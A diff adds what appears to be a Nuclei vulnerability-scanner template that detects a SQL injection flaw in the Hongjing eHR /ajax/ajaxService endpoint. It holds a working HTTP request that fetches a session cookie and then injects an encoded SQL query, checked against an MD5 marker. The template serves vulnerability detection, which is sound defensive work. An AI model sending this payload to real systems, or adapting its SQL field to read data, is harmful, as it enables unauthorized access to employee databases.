@@ -1,0 +1,44 @@
+id: poc-yaml-hongjing-ehr-ajaxservice-sqli
+info:
+  name: Hongjing eHR /ajax/ajaxService SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        GET /templates/index/getpassword.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: session_cookie
+        internal: true
+        group: 1
+        regex:
+          - "JSESSIONID=(.*?);"
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /ajax/ajaxService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: JSESSIONID={{session_cookie}}
+
+        __type=extTrans&__xml={"functionId":"151211001137","sql":"select~20sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{t1}}'))~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
